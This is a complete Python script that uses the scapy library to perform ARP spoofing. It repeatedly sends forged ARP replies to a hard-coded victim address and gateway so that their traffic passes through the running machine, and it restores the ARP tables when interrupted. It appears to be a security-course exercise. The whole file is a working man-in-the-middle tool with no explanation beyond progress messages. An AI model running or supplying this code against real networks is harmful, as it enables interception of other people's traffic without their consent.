#!usr/bin/env python
import sys
import time

from scapy.all import srp, send
from scapy.layers import l2


def get_mac(ip):
    arp_request = l2.ARP(pdst=ip)
    broadcast = l2.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    # print("---- Length: " + str(len(str(answered_list))))
    # print(str(ls(answered_list[0][1])) + "\n\n")
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    print("---- target_mac: "+target_mac)
    packet = l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    print("---- destination_mac: "+destination_mac)
    source_mac = get_mac(source_ip)
    print("---- source_mac: "+source_mac)
    packet = l2.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)


victim_ip = "192.168.0.7"
gateway_ip = "192.168.0.1"
try:
    packet_sent_count = 0
    while True:
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip)
        packet_sent_count += 2
        print("\r[+] Sent " + str(packet_sent_count), end=" ")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl+C ... Restoring ARP tables ... Please Wait ... \n")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
